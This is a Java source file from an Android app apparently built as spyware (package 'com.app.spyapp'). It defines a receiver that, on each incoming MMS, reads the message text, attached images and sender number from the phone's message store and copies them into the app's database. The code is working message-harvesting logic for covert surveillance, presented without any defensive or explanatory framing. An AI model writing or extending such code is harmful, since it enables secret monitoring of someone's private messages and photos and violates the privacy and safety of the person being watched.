package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.widget.Toast;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Utils;
import com.app.spyapp.model.MMSModel;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.sql.Date;
import java.text.MessageFormat;


public class MMSReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    @Override
    public void onReceive(Context context, Intent intent) {
        spyApp = (SpyApp) context.getApplicationContext();
        MMSModel mmsModel = getMMS(context);
        if (mmsModel != null) {
            spyApp.getDatabaseHelper().insertMMS(mmsModel);
        }
        Toast.makeText(context, "MMS comes", Toast.LENGTH_LONG).show();
    }

    private MMSModel getMMS(Context context) {
        ContentResolver contentResolver = context.getContentResolver();
        final String[] projection = new String[]{"*"};
        Uri uri = Uri.parse("content://mms-sms/conversations/");
        Cursor query = contentResolver.query(uri, projection, null, null, null);
        if (query.moveToFirst()) {
            do {
                String string = query.getString(query.getColumnIndex("ct_t"));
                if ("application/vnd.wap.multipart.related".equals(string)) {
                    // it's MMS
                    MMSModel mmsModel = new MMSModel();

                    String msgId = query.getString(query.getColumnIndex("_id"));
                    String content = getMMSTextContent(msgId, context);
                    String imagePath = getImageFromMMS(msgId, context);
                    String address = getAddressNumber(msgId, context);
                    String msgtype = query.getString(query.getColumnIndex("type"));
                    String datemilies = query.getString(query.getColumnIndex("date"));
                    Date date = new Date(Long.valueOf(datemilies));
                    mmsModel.setMsgId(msgId);
                    mmsModel.setMsgTextContent(content);
                    mmsModel.setMsgImagePath(imagePath);
                    mmsModel.setAddress(address);
                    mmsModel.setType(Const.TYPE_RECEIVE_STRING);
                    mmsModel.setDate(Utils.convertMilisToDate(date.getTime()));
                    return mmsModel;
                } else {
                    // it's SMS

                }
            } while (query.moveToNext());
        }
        return null;
    }


    /**
     * get MMS TextContent
     *
     * @param mmsId
     */
    private String getMMSTextContent(String mmsId, Context context) {
        String selectionPart = "mid=" + mmsId;
        Uri uri = Uri.parse("content://mms/part");
        Cursor cursor = context.getContentResolver().query(uri, null,
                selectionPart, null, null);


        if (cursor.moveToFirst()) {
            String body = "";
            do {
                String partId = cursor.getString(cursor.getColumnIndex("_id"));
                String type = cursor.getString(cursor.getColumnIndex("ct"));
                if ("text/plain".equals(type)) {
                    String data = cursor.getString(cursor.getColumnIndex("_data"));

                    if (data != null) {
                        // implementation of this method below
                        body = getMmsText(partId, context);
                    } else {
                        body = cursor.getString(cursor.getColumnIndex("text"));
                    }
                }

            } while (cursor.moveToNext());
            return body;
        }
        return null;
    }


    /**
     * getMMS text
     *
     * @param id
     * @return
     */
    private String getMmsText(String id, Context context) {
        Uri partURI = Uri.parse("content://mms/part/" + id);
        InputStream is = null;
        StringBuilder sb = new StringBuilder();
        try {
            is = context.getContentResolver().openInputStream(partURI);
            if (is != null) {
                InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                BufferedReader reader = new BufferedReader(isr);
                String temp = reader.readLine();
                while (temp != null) {
                    sb.append(temp);
                    temp = reader.readLine();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
        }
        return sb.toString();
    }

    /**
     * How to get image from MMS
     *
     * @param mmsId
     */
    private String getImageFromMMS(String mmsId, Context context) {
        String selectionPart = "mid=" + mmsId;
        Uri uri = Uri.parse("content://mms/part");
        Cursor cPart = context.getContentResolver().query(uri, null,
                selectionPart, null, null);
        String path = null;
        if (cPart.moveToFirst()) {
            do {
                String partId = cPart.getString(cPart.getColumnIndex("_id"));
                String type = cPart.getString(cPart.getColumnIndex("ct"));
                if ("image/jpeg".equals(type) || "image/bmp".equals(type) ||
                        "image/gif".equals(type) || "image/jpg".equals(type) ||
                        "image/png".equals(type)) {
                    path = getMmsImage(partId, context);
                }
            } while (cPart.moveToNext());
        }

        return path;

    }


    private String getMmsImage(String _id, Context context) {
        Uri partURI = Uri.parse("content://mms/part/" + _id);
        InputStream is = null;
        Bitmap bitmap = null;
        String imagePath = null;
        try {
            is = context.getContentResolver().openInputStream(partURI);
            bitmap = BitmapFactory.decodeStream(is);
            if (bitmap != null) {
                imagePath = Utils.storeImage(bitmap);
            }

        } catch (IOException e) {
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
        }
        return imagePath;
    }


    /**
     * How to get the sender address
     *
     * @param id
     * @return
     */
    private String getAddressNumber(String id, Context context) {
        String selectionAdd = new String("msg_id=" + id);
        String uriStr = MessageFormat.format("content://mms/{0}/addr", id);
        Uri uriAddress = Uri.parse(uriStr);
        Cursor cAdd = context.getContentResolver().query(uriAddress, null,
                selectionAdd, null, null);
        String name = null;
        if (cAdd.moveToFirst()) {
            do {
                String number = cAdd.getString(cAdd.getColumnIndex("address"));
                if (number != null) {
                    try {
                        Long.parseLong(number.replace("-", ""));
                        name = number;
                    } catch (NumberFormatException nfe) {
                        if (name == null) {
                            name = number;
                        }
                    }
                }
            } while (cAdd.moveToNext());
        }
        if (cAdd != null) {
            cAdd.close();
        }
        return name;
    }
}
